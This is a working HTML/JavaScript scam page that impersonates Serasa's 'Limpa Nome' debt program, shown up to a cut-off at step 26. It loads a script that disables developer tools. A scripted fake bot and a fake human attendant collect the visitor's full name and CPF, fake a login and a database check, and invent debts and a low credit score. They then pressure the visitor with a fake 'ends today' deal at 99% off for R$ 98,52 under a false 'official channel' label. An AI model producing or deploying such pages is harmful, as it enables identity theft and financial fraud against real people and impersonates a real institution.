<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Feirão Serasa - Atendimento</title>
<script src="https://cdn.jsdelivr.net/npm/disable-devtools"></script>
<!-- 1. APENAS O UTMIFY - Ele já cuida de tudo -->
<script src="scripts/utms/latest-1.js" data-utmify-prevent-subids="" async defer></script>
<script>
      window.pixelId = "6939d79855be7738fa1fec49";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
</script>

<!-- Configurações de estilo (mantidas) -->
<link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  /* TEMA ROSA - TUDO ROSA */
  :root {
    --primary: #e80070;
    --primary-light: #ff4d9e;
    --primary-dark: #c60060;
    --primary-extra-light: #ffe6f2;
    --primary-light-bg: #fff0f7;
    --bot-bg: #ffe6f2;
    --user-bg: #e80070;
    --atendente-bg: #ffe6f2;
    --system-bg: #fff0f7;
    --text-dark: #660033;
    --text-light: #fff;
    --shadow: 0 2px 10px rgba(232, 0, 112, 0.15);
    --radius: 12px;
    --radius-sm: 8px;
    --transition: all 0.3s ease;
  }

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: 'Inter', sans-serif;
    background: #fff0f7;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
  }

  .chat-container {
    width: 100%;
    max-width: 420px;
    height: 60vh;
    background: white;
    border-radius: 20px;
    box-shadow: 0 10px 30px rgba(232, 0, 112, 0.15);
    display: flex;
    flex-direction: column;
    overflow: hidden;
    position: relative;
    border: 1px solid #ffe6f2;
  }

  .chat-header {
    background: linear-gradient(135deg, #e80070, #ff4d9e);
    color: white;
    padding: 18px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
    z-index: 100;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    flex-shrink: 0;
  }

  .header-left {
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .serasa-logo {
    width: 40px;
    height: 40px;
    background: white;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 800;
    color: var(--primary);
    font-size: 18px;
  }

  .header-text h2 {
    font-size: 1.1rem;
    font-weight: 700;
    margin-bottom: 3px;
  }

  .header-text p {
    font-size: 0.75rem;
    opacity: 0.9;
    display: flex;
    align-items: center;
    gap: 6px;
  }

  .status-dot {
    width: 8px;
    height: 8px;
    background: #fff;
    border-radius: 50%;
  }

  .header-right {
    font-size: 0.75rem;
    opacity: 0.9;
    display: flex;
    align-items: center;
    gap: 5px;
  }

  .messages-container {
    flex: 1;
    padding: 20px;
    overflow-y: auto;
    background: #fff0f7;
    display: flex;
    flex-direction: column;
    gap: 12px;
    min-height: 0;
  }

  .messages-container::-webkit-scrollbar {
    width: 6px;
  }

  .messages-container::-webkit-scrollbar-track {
    background: #ffe6f2;
    border-radius: 10px;
  }

  .messages-container::-webkit-scrollbar-thumb {
    background: var(--primary);
    border-radius: 10px;
  }

  .message {
    max-width: 85%;
    padding: 12px 14px;
    border-radius: var(--radius-sm);
    position: relative;
    line-height: 1.4;
    word-wrap: break-word;
    font-size: 0.9rem;
    animation: messageAppear 0.3s ease-out;
  }

  @keyframes messageAppear {
    from {
      opacity: 0;
      transform: translateY(10px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .bot-message {
    background: var(--bot-bg);
    align-self: flex-start;
    border-bottom-left-radius: 4px;
    border-left: 3px solid var(--primary);
    color: var(--text-dark);
    box-shadow: var(--shadow);
  }

  .atendente-message {
    background: var(--atendente-bg);
    align-self: flex-start;
    border-bottom-left-radius: 4px;
    border-left: 3px solid var(--primary);
    color: var(--text-dark);
    box-shadow: var(--shadow);
  }

  .user-message {
    background: var(--user-bg);
    color: var(--text-light);
    align-self: flex-end;
    border-bottom-right-radius: 4px;
    border-right: 3px solid var(--primary-dark);
    box-shadow: var(--shadow);
  }

  .system-message {
    background: var(--system-bg);
    align-self: center;
    font-size: 0.8rem;
    color: var(--text-dark);
    max-width: 90%;
    padding: 8px 12px;
    border-radius: 20px;
    border: 1px solid var(--primary-light);
    text-align: center;
    box-shadow: var(--shadow);
  }

  .message-header {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 6px;
    font-size: 0.8rem;
    font-weight: 600;
    color: var(--primary-dark);
  }

  .message-avatar {
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    border: 2px solid white;
  }

  .bot-avatar {
    background: var(--primary);
    color: white;
  }

  .atendente-avatar {
    background: var(--primary);
    color: white;
  }

  .avatar-img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }

  .message-time {
    font-size: 0.7rem;
    opacity: 0.6;
    margin-top: 5px;
    text-align: right;
    color: var(--text-dark);
  }

  .message-media {
    margin-top: 10px;
    text-align: center;
  }
  
  .media-audio::-webkit-media-controls-panel {
    background: var(--primary-extra-light);
    width: 100%;
  }
  
  .media-image {
    width: 80vw;
    height: 60vh;
    object-fit: contain;
    border-radius: var(--radius-sm);
    border: 2px solid var(--primary-light);
    box-shadow: 0 2px 5px rgba(232, 0, 112, 0.1);
    background-color: white;
    margin: 0 auto;
    display: block;
    max-width: 100%;
  }

  .media-gif {
    width: 80vw;
    height: 60vh;
    object-fit: contain;
    border-radius: var(--radius-sm);
    margin-top: 10px;
    background-color: white;
    margin: 0 auto;
    display: block;
    max-width: 100%;
    border: 2px solid var(--primary-light);
  }

  .logo-img {
    width: 60vw;
    height: 30vh;
    object-fit: contain;
    background-color: white;
    padding: 10px;
    border-radius: var(--radius-sm);
    border: 2px solid var(--primary-light);
  }

  .message-media {
    margin-top: 10px;
    text-align: center;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: white;
    border-radius: var(--radius-sm);
    padding: 5px;
    border: 1px solid var(--primary-extra-light);
  }

  .logos-container {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin: 10px 0;
    flex-wrap: wrap;
    background-color: white;
    padding: 10px;
    border-radius: var(--radius-sm);
    border: 1px solid var(--primary-extra-light);
  }

  .highlight-box {
    background: #fff0f7;
    padding: 10px;
    border-radius: var(--radius-sm);
    border-left: 3px solid var(--primary);
    margin: 8px 0;
    font-size: 0.85rem;
    color: var(--text-dark);
    border: 1px solid var(--primary-light);
  }

  .danger-box {
    background: #fff0f7;
    padding: 10px;
    border-radius: var(--radius-sm);
    border-left: 3px solid var(--primary);
    margin: 8px 0;
    font-size: 0.85rem;
    color: var(--text-dark);
    border: 1px solid var(--primary-light);
  }

  .success-box {
    background: #fff0f7;
    padding: 10px;
    border-radius: var(--radius-sm);
    border-left: 3px solid var(--primary);
    margin: 8px 0;
    font-size: 0.85rem;
    color: var(--text-dark);
    border: 1px solid var(--primary-light);
  }

  .masked-data {
    background: white;
    padding: 8px 10px;
    border-radius: var(--radius-sm);
    border: 1px solid var(--primary-light);
    font-family: 'Courier New', monospace;
    margin: 6px 0;
    text-align: center;
    font-size: 0.85rem;
    color: var(--text-dark);
  }

  .buttons-container {
    display: flex;
    flex-direction: column;
    gap: 8px;
    margin-top: 12px;
    animation: buttonsSlideUp 0.3s ease-out;
  }

  @keyframes buttonsSlideUp {
    from {
      opacity: 0;
      transform: translateY(10px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .action-btn {
    padding: 12px 16px;
    background: white;
    border: 2px solid var(--primary);
    color: var(--primary);
    border-radius: var(--radius-sm);
    font-weight: 600;
    cursor: pointer;
    transition: var(--transition);
    font-size: 0.9rem;
    text-align: center;
    display: block;
    box-shadow: var(--shadow);
  }

  .action-btn:hover {
    background: var(--primary);
    color: white;
    transform: translateY(-2px);
  }

  .action-btn:active {
    transform: scale(0.98);
  }

  .primary-btn {
    background: var(--primary);
    color: white;
    border: none;
  }

  .primary-btn:hover {
    background: var(--primary-dark);
  }

  .success-btn {
    background: var(--primary);
    color: white;
    border: none;
  }

  .success-btn:hover {
    background: var(--primary-dark);
  }

  .cpf-input-container {
    margin-top: 12px;
  }

  .cpf-input {
    width: 100%;
    padding: 12px;
    border: 2px solid var(--primary-light);
    border-radius: var(--radius-sm);
    font-size: 1rem;
    font-family: 'Courier New', monospace;
    letter-spacing: 2px;
    text-align: center;
    transition: var(--transition);
    background: white;
    color: var(--text-dark);
  }

  .cpf-input:focus {
    outline: none;
    border-color: var(--primary);
    box-shadow: 0 0 0 2px rgba(232, 0, 112, 0.2);
  }

  .cpf-hint {
    font-size: 0.75rem;
    color: var(--primary-dark);
    margin-top: 6px;
    text-align: center;
  }

  .chat-footer {
    padding: 12px 15px;
    background: white;
    border-top: 1px solid var(--primary-extra-light);
    font-size: 0.7rem;
    color: var(--primary-dark);
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-shrink: 0;
  }

  .security-badge {
    display: flex;
    align-items: center;
    gap: 5px;
    color: var(--primary);
  }

  .typing-indicator {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 10px 14px;
    background: var(--bot-bg);
    border-radius: var(--radius-sm);
    width: fit-content;
    margin-bottom: 5px;
    border-left: 3px solid var(--primary);
    color: var(--text-dark);
    box-shadow: var(--shadow);
  }

  .typing-dots {
    display: flex;
    gap: 4px;
  }

  .typing-dot {
    width: 6px;
    height: 6px;
    background: var(--primary);
    border-radius: 50%;
    animation: typingAnimation 1s infinite ease-in-out;
  }

  .typing-dot:nth-child(1) { animation-delay: -0.32s; }
  .typing-dot:nth-child(2) { animation-delay: -0.16s; }

  @keyframes typingAnimation {
    0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
    40% { transform: scale(1); opacity: 1; }
  }

  .loading-gif {
    display: none;
    width: 300px;
    height: 100px;
    background: linear-gradient(90deg, #ffe6f2 25%, #ffcce5 50%, #ffe6f2 75%);
    border-radius: var(--radius-sm);
    margin: 10px auto;
    animation: loading 1.5s infinite ease-in-out;
    background-size: 200% 100%;
    border: 1px solid var(--primary-light);
  }

  @keyframes loading {
    0% { background-position: 200% 0; }
    100% { background-position: -200% 0; }
  }

  .audio-timer {
    font-size: 0.7rem;
    color: var(--primary-dark);
    margin-top: 5px;
    text-align: center;
    font-style: italic;
  }

  @media (max-width: 480px) {
    .chat-container {
      height: 100vh;
      max-width: 100%;
      border-radius: 0;
    }
    
    body {
      padding: 0;
    }
    
    .chat-header {
      padding: 15px;
    }
    
    .messages-container {
      padding: 15px;
    }
    
    .message {
      max-width: 90%;
      padding: 10px 12px;
    }
    
    .action-btn {
      padding: 10px 14px;
      font-size: 0.85rem;
    }

    .media-image, .media-gif {
      width: calc(100vw - 40px);
      max-width: 100%;
      height: auto;
      max-height: 50vh;
    }
    
    .logo-img {
      width: calc(100vw - 40px);
      max-width: 100%;
      height: auto;
      max-height: 20vh;
    }
    
    .loading-gif {
      width: 80vw;
      height: 60vh;
    }
  }
</style>
</head>
<body>

<div class="chat-container">
  <div class="chat-header">
    <div class="header-left">
      <div class="serasa-logo">
        <i class="fas fa-shield-alt"></i>
      </div>
      <div class="header-text">
        <h2>Serasa Limpa Nome</h2>
        <p><span class="status-dot"></span> Responde em até 2 horas</p>
      </div>
    </div>
    <div class="header-right">
      <i class="far fa-clock"></i>
      <span>Online</span>
    </div>
  </div>

  <div class="messages-container" id="messages"></div>

  <div class="chat-footer">
    <div class="security-badge">
      <i class="fas fa-lock"></i>
      <span>Atendimento seguro</span>
    </div>
    <div>Canal oficial Serasa</div>
  </div>
</div>

<script>
// ==============================================
// FUNÇÕES DE VALIDAÇÃO
// ==============================================

// Função de validação de CPF da Receita Federal
function validaCPF(cpf) {
  var Soma = 0;
  var Resto;

  var strCPF = String(cpf).replace(/[^\d]/g, "");
  
  if (strCPF.length !== 11)
     return false;
  
  // Verifica CPFs com todos os dígitos iguais
  if ([
    '00000000000',
    '11111111111',
    '22222222222',
    '33333333333',
    '44444444444',
    '55555555555',
    '66666666666',
    '77777777777',
    '88888888888',
    '99999999999',
    ].indexOf(strCPF) !== -1)
    return false;

  // Calcula primeiro dígito verificador
  for (i=1; i<=9; i++)
    Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (11 - i);

  Resto = (Soma * 10) % 11;

  if ((Resto == 10) || (Resto == 11)) 
    Resto = 0;

  if (Resto != parseInt(strCPF.substring(9, 10)) )
    return false;

  Soma = 0;

  // Calcula segundo dígito verificador
  for (i = 1; i <= 10; i++)
    Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (12 - i);

  Resto = (Soma * 10) % 11;

  if ((Resto == 10) || (Resto == 11)) 
    Resto = 0;

  if (Resto != parseInt(strCPF.substring(10, 11) ) )
    return false;

  return true;
}

// Função de validação de nome
function validaNome(nome) {
  // Remove espaços extras
  nome = nome.trim();
  
  // Verifica se está vazio
  if (nome === "") {
    return { valido: false, mensagem: "Por favor, digite seu nome completo." };
  }
  
  // Verifica se tem pelo menos 2 palavras (nome e sobrenome)
  const partesNome = nome.split(/\s+/).filter(p => p.length > 0);
  if (partesNome.length < 2) {
    return { valido: false, mensagem: "Por favor, digite seu nome completo com sobrenome." };
  }
  
  // Verifica se cada parte tem pelo menos 2 caracteres
  for (let parte of partesNome) {
    if (parte.length < 2) {
      return { valido: false, mensagem: "Cada parte do nome deve ter pelo menos 2 letras." };
    }
  }
  
  // Verifica se o nome total tem pelo menos 6 caracteres
  if (nome.replace(/\s/g, '').length < 6) {
    return { valido: false, mensagem: "O nome deve ter pelo menos 6 letras." };
  }
  
  // Verifica se contém apenas letras, espaços e caracteres comuns em nomes
  const regexNome = /^[A-Za-zÀ-ÖØ-öø-ÿ\s.'-]+$/;
  if (!regexNome.test(nome)) {
    return { valido: false, mensagem: "O nome deve conter apenas letras e espaços." };
  }
  
  // Verifica nomes absurdos/aleatórios
  const nomesInvalidos = [
    'teste', 'aaaaaa', 'bbbbbb', 'cccccc', 'dddddd', 'eeeeee', 
    'ffffff', 'abcdef', 'qwerty', 'asdfgh', 'zxcvbn', '123456',
    'nome teste', 'fulano', 'cicrano', 'beltrano', 'aaa bbb'
  ];
  
  const nomeLower = nome.toLowerCase();
  for (let nomeInvalido of nomesInvalidos) {
    if (nomeLower === nomeInvalido) {
      return { valido: false, mensagem: "Por favor, digite seu nome real completo." };
    }
  }
  
  // Verifica sequências repetidas
  if (/(.)\1{4,}/.test(nomeLower.replace(/\s/g, ''))) {
    return { valido: false, mensagem: "O nome parece conter sequências repetidas." };
  }
  
  // Verifica padrões de teclado
  const padroesTeclado = [
    'qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', 'edcrfv', 'tgbnhy',
    'yhnujm', 'ikm', 'olp', 'p[]', 'ç~', '1qaz', '2wsx', '3edc',
    '4rfv', '5tgb', '6yhn', '7ujm', '8ik', '9ol', '0pç'
  ];
  
  for (let padrao of padroesTeclado) {
    if (nomeLower.includes(padrao)) {
      return { valido: false, mensagem: "O nome parece conter padrões de teclado." };
    }
  }
  
  return { valido: true, mensagem: "" };
}

// ==============================================
// FUNÇÕES PRINCIPAIS
// ==============================================

// FUNÇÃO PARA REDIRECIONAMENTO COM PARÂMETROS UTM
function redirecionarComUtm(url) {
  // Pega todos os parâmetros da URL atual
  const params = window.location.search;
  // Se já tiver parâmetros na URL de destino, adiciona corretamente
  const separator = url.includes('?') ? '&' : '?';
  // Monta a URL final com todos os parâmetros
  const urlFinal = params ? url + separator + params.substring(1) : url;
  
  console.log('Redirecionando para:', urlFinal);
  window.location.href = urlFinal;
}

// Função para obter CPF e NOME da URL
function getDataFromURL() {
  const params = new URLSearchParams(window.location.search);
  return {
    cpf: params.get('cpf'),
    nome: params.get('nome') ? decodeURIComponent(params.get('nome')) : null
  };
}

// Verificar se já tem CPF e Nome na URL
const urlData = getDataFromURL();

// Dados do usuário
let userCPF = '';
let userName = '';
let dadosValidos = false;

// Durações dos áudios em segundos
const audioDurations = {
  audio1: 17,
  audio2: 24,
  audio3: 36,
  audio4: 34,
  audio5: 30
};

// Função para mascarar CPF
function maskCPF(cpf) {
  if (!cpf) return '';
  cpf = cpf.toString().replace(/\D/g, '');
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

// Função para mostrar indicador de digitação
function showTypingIndicator(senderName = 'Bot') {
  const messagesContainer = document.getElementById('messages');
  const typingDiv = document.createElement('div');
  typingDiv.className = 'typing-indicator';
  
  const isAtendente = senderName.includes('Fernanda');
  typingDiv.innerHTML = `
    <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
      ${isAtendente ? 
        '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
        '<i class="fas fa-robot"></i>'}
    </div>
    <div class="typing-dots">
      <div class="typing-dot"></div>
      <div class="typing-dot"></div>
      <div class="typing-dot"></div>
    </div>
    <span style="font-size: 0.8rem; color: var(--primary-dark);">${senderName} está digitando...</span>
  `;
  
  messagesContainer.appendChild(typingDiv);
  scrollToBottom();
  return typingDiv;
}

// Função para adicionar mensagem simples
function addMessage(text, type = 'bot', sender = '', media = '') {
  const messagesContainer = document.getElementById('messages');
  const messageDiv = document.createElement('div');
  messageDiv.className = `message ${type}-message`;
  
  let header = '';
  if (type === 'bot' || type === 'atendente') {
    const isAtendente = type === 'atendente';
    header = `
      <div class="message-header">
        <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
          ${isAtendente ? 
            '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
            '<i class="fas fa-robot"></i>'}
        </div>
        <span>${sender || (isAtendente ? 'Fernanda - Atendente' : 'Bot Serasa')}</span>
      </div>
    `;
  }
  
  const timestamp = new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
  
  messageDiv.innerHTML = `
    ${header}
    <div class="message-content">${text}</div>
    ${media || ''}
    <div class="message-time">${timestamp}</div>
  `;
  
  messagesContainer.appendChild(messageDiv);
  scrollToBottom();
  
  return messageDiv;
}

// Função para mostrar botões - COM REDIRECIONAMENTO CORRETO
function showButtons(buttons) {
  const messagesContainer = document.getElementById('messages');
  const buttonsContainer = document.createElement('div');
  buttonsContainer.className = 'buttons-container';
  
  buttons.forEach(button => {
    const btn = document.createElement('button');
    btn.className = `action-btn ${button.type || 'primary'}-btn`;
    btn.textContent = button.text;
    
    btn.addEventListener('click', () => {
      btn.style.transform = 'scale(0.98)';
      setTimeout(() => {
        btn.style.transform = '';
      }, 150);
      
      addMessage(button.text, 'user');
      
      document.querySelectorAll('.buttons-container').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(-10px)';
        setTimeout(() => el.remove(), 300);
      });
      
      // VERIFICA SE TEM REDIRECT URL
      if (button.redirectUrl) {
        setTimeout(() => {
          // USANDO A FUNÇÃO CORRETA PARA REDIRECIONAR COM UTM
          redirecionarComUtm(button.redirectUrl);
        }, 1000);
      } else {
        setTimeout(() => {
          processStep(button.next);
        }, 600);
      }
    });
    
    buttonsContainer.appendChild(btn);
  });
  
  messagesContainer.appendChild(buttonsContainer);
  scrollToBottom();
}

// Função para mostrar input de CPF e NOME
function showDataInput() {
  const messagesContainer = document.getElementById('messages');
  const inputContainer = document.createElement('div');
  inputContainer.className = 'cpf-input-container';
  
  inputContainer.innerHTML = `
    <input type="text" class="cpf-input" id="nomeInput" placeholder="Digite seu nome completo" style="margin-bottom: 10px;">
    <input type="text" class="cpf-input" id="cpfInput" placeholder="000.000.000-00" maxlength="14">
    <div class="cpf-hint">Digite seu nome completo e CPF para continuar</div>
    <div class="buttons-container" style="margin-top: 12px;">
      <button class="action-btn primary-btn" id="confirmData">Confirmar Dados</button>
    </div>
  `;
  
  messagesContainer.appendChild(inputContainer);
  scrollToBottom();
  
  setTimeout(() => {
    const nomeInput = document.getElementById('nomeInput');
    if (nomeInput) {
      nomeInput.focus();
    }
    
    const cpfInput = document.getElementById('cpfInput');
    if (cpfInput) {
      cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.substring(0, 11);
        
        if (value.length > 9) {
          value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
          value = value.replace(/^(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
        } else if (value.length > 3) {
          value = value.replace(/^(\d{3})(\d{0,3})/, '$1.$2');
        }
        e.target.value = value;
      });
    }
  }, 100);
  
  document.getElementById('confirmData').addEventListener('click', function() {
    validateData();
  });
  
  document.getElementById('nomeInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') document.getElementById('cpfInput').focus();
  });
  
  document.getElementById('cpfInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') validateData();
  });
}

// Função para validar dados
async function validateData(inputData = null) {
  let nome, cpf;
  
  if (inputData !== null && inputData !== undefined) {
    nome = inputData.nome;
    cpf = inputData.cpf;
  } else {
    const nomeInput = document.getElementById('nomeInput');
    const cpfInput = document.getElementById('cpfInput');
    if (!nomeInput || !cpfInput) return;
    
    nome = nomeInput.value.trim();
    cpf = cpfInput.value;
  }
  
  cpf = cpf.toString().replace(/\D/g, '');
  
  // Validação do nome usando a função validaNome
  const validacaoNome = validaNome(nome);
  if (!validacaoNome.valido) {
    const typingIndicator = showTypingIndicator('Sistema');
    await new Promise(resolve => setTimeout(resolve, 800));
    typingIndicator.remove();
    
    addMessage(validacaoNome.mensagem, 'system');
    return false;
  }
  
  // Validação do CPF usando a função validaCPF
  if (!validaCPF(cpf)) {
    const typingIndicator = showTypingIndicator('Sistema');
    await new Promise(resolve => setTimeout(resolve, 800));
    typingIndicator.remove();
    
    addMessage('CPF inválido. Por favor, digite um CPF válido com 11 números.', 'system');
    return false;
  }
  
  // SALVA OS DADOS DO USUÁRIO
  userCPF = cpf;
  userName = nome;
  dadosValidos = true;
  
  const inputContainer = document.querySelector('.cpf-input-container');
  if (inputContainer) {
    inputContainer.style.opacity = '0';
    inputContainer.style.transform = 'translateY(-10px)';
    setTimeout(() => inputContainer.remove(), 300);
  }
  
  if (inputData === null || inputData === undefined) {
    addMessage(`${nome} - ${maskCPF(cpf)}`, 'user');
  } else {
    const typingIndicator = showTypingIndicator('Sistema');
    await new Promise(resolve => setTimeout(resolve, 800));
    typingIndicator.remove();
    
    addMessage(`Dados de ${nome} identificados automaticamente.`, 'system');
  }
  
  setTimeout(() => processStep(4), 800);
  return true;
}

// Função para rolar para baixo
function scrollToBottom() {
  const messagesContainer = document.getElementById('messages');
  if (messagesContainer) {
    messagesContainer.scrollTop = messagesContainer.scrollHeight;
  }
}

// URLs das mídias
const mediaUrls = {
  logoGovSer: './files/img1.webp',
  feiraoSemFraude: './files/img2.webp',
  verificacaoInfo: './files/undefined-Imgur.gif',
  empresas: './files/i0ru2501hphkj30ccq2zxph8.jpg',
  feiraoEncerra: './files/cdjnv4qe3p98g7xpdjzjablm.png',
  scoreImage: './files/f3fix5xne4w8mlawce5edzqc.png',
  audio1: './files/audio1.mp3',
  audio2: './files/audio2.mp3',
  audio3: './files/audio3.mp3',
  audio4: './files/audio4.mp3',
  audio5: './files/audio5.mp3'
};

// Fluxo do chat
const flow = [
  {
    id: 1,
    type: 'bot',
    sender: 'Bot Serasa',
    content: 'Bem-vindo ao canal oficial Serasa Limpa Nome!',
    media: `
      <div class="logos-container">
        <img src="${mediaUrls.logoGovSer}" alt="GovernoSerasa" class="logo-img">
      </div>
    `,
    autoNext: true
  },
  {
    id: 2,
    type: 'bot',
    sender: 'Bot Serasa',
    content: 'Feirão Serasa Limpa Nome - Programa oficial sem fraudes',
    autoNext: true
  },
  {
    id: 3,
    type: 'bot',
    sender: 'Bot Serasa',
    content: 'Olá! Para começarmos, preciso que você digite seu nome completo e CPF para identificarmos seu perfil:',
    action: 'input_data'
  },
  {
    id: 4,
    type: 'system',
    content: 'Verificando dados no banco de dados Serasa...',
    autoNext: true
  },
  {
    id: 5,
    type: 'system',
    content: 'Dados validados com sucesso!',
    media: `<div class="message-media"><img src="${mediaUrls.feiraoSemFraude}" alt="Feirão Sem Fraude" class="media-image"></div>`,
    autoNext: true
  },
  {
    id: 6,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Olá! Eu sou a Fernanda, sua atendente especialista.',
    subtext: 'Antes de começarmos, posso confirmar se as informações abaixo estão corretas?',
    delay: true
  },
  {
    id: 7,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Confirmação de dados:',
    subtext: `<div class="highlight-box">
        <strong>Nome informado:</strong>
        <div class="masked-data">Aguardando...</div>
        <strong>CPF informado:</strong>
        <div class="masked-data">Aguardando...</div>
        <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
      </div>`,
    buttons: [
      { text: 'Sim, estão corretas', next: 8, type: 'primary' }
    ]
  },
  {
    id: 8,
    type: 'system',
    content: 'Áudio de confirmação',
    media: `<div class="message-media">
      <audio controls autoplay class="media-audio">
        <source src="${mediaUrls.audio1}" type="audio/mpeg">
        Seu navegador não suporta áudio.
      </audio>
      <div class="audio-timer"></div>
    </div>`,
    audioStep: true,
    audioFile: 'audio1'
  },
  {
    id: 9,
    type: 'system',
    content: 'Verificando informações do CPF...',
    media: `<div class="message-media"><img src="${mediaUrls.verificacaoInfo}" alt="Verificação" class="media-image"></div>`,
    autoNext: true
  },
  {
    id: 10,
    type: 'system',
    content: 'Acessando sua conta Serasa...',
    autoNext: true
  },
  {
    id: 11,
    type: 'system',
    content: 'Login realizado com sucesso!',
    autoNext: true
  },
  {
    id: 12,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Perfeito!',
    subtext: 'Agora vou mostrar as empresas disponíveis para negociação no seu perfil:',
    delay: true
  },
  {
    id: 13,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Empresas disponíveis para negociação:',
    media: `<div class="message-media"><img src="${mediaUrls.empresas}" alt="Empresas" class="media-image"></div>`,
    buttons: [
      { text: 'QUERO VER AS OPÇÕES', next: 14, type: 'primary' }
    ]
  },
  {
    id: 14,
    type: 'system',
    content: 'Áudio sobre empresas parceiras',
    media: `<div class="message-media">
      <audio controls autoplay class="media-audio">
        <source src="${mediaUrls.audio2}" type="audio/mpeg">
        Seu navegador não suporta áudio.
      </audio>
      <div class="audio-timer"></div>
    </div>`,
    audioStep: true,
    audioFile: 'audio2'
  },
  {
    id: 15,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'ATENÇÃO: Feirão encerra hoje!',
    media: `<div class="message-media"><img src="${mediaUrls.feiraoEncerra}" alt="Feirão Encerra" class="media-image"></div>`,
    autoNext: true
  },
  {
    id: 16,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Você gostaria de aproveitar o último dia do Feirão Limpa Nome?',
    buttons: [
      { text: 'SIM! QUERO NEGOCIAR', next: 17, type: 'success' }
    ]
  },
  {
    id: 17,
    type: 'system',
    content: 'Analisando situação cadastral...',
    autoNext: true
  },
  {
    id: 18,
    type: 'system',
    content: 'Consulta concluída!',
    autoNext: true
  },
  {
    id: 19,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Situação cadastral:',
    media: `<div class="message-media"><img src="${mediaUrls.scoreImage}" alt="Score Baixo" class="media-image"></div>`,
    subtext: `Identificamos 4 dívidas ativas no sistema do CPF informado.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`,
    buttons: [
      { text: 'BUSCAR ACORDOS DISPONÍVEIS', next: 20, type: 'primary' }
    ]
  },
  {
    id: 20,
    type: 'system',
    content: 'Áudio sobre análise',
    media: `<div class="message-media">
      <audio controls autoplay class="media-audio">
        <source src="${mediaUrls.audio3}" type="audio/mpeg">
        Seu navegador não suporta áudio.
      </audio>
      <div class="audio-timer"></div>
    </div>`,
    audioStep: true,
    audioFile: 'audio3'
  },
  {
    id: 21,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'Consultando Programa Desenrola Brasil...',
    media: `<div class="loading-gif"></div>`,
    autoNext: true
  },
  {
    id: 22,
    type: 'system',
    content: 'Áudio sobre Desenrola Brasil',
    media: `<div class="message-media">
      <audio controls autoplay class="media-audio">
        <source src="${mediaUrls.audio4}" type="audio/mpeg">
        Seu navegador não suporta áudio.
      </audio>
      <div class="audio-timer"></div>
    </div>`,
    audioStep: true,
    audioFile: 'audio4'
  },
  {
    id: 23,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
    content: 'ACORDO ENCONTRADO!',
    subtext: `<div class="success-box">
        <strong>OFERTA EXCLUSIVA:</strong><br><br>
        • 99% DE DESCONTO<br>
        • Quitação de TODAS as 4 dívidas<br>
        • Aumento para 890 pontos no score<br>
        • Limpeza imediata do nome<br><br>
        <strong style="font-size: 1rem;">VALOR TOTAL: R$ 98,52</strong>
      </div>`,
    buttons: [
      { text: 'CONFIRMAR ACORDO E LIMPAR NOME', next: 24, type: 'success' }
    ]
  },
  {
    id: 24,
    type: 'system',
    content: 'Gerando contrato do acordo...',
    autoNext: true
  },
  {
    id: 25,
    type: 'system',
    content: 'Acordo confirmado com sucesso!',
    autoNext: true
  },
  {
    id: 26,
    type: 'atendente',
    sender: 'Fernanda - Especialista Serasa',
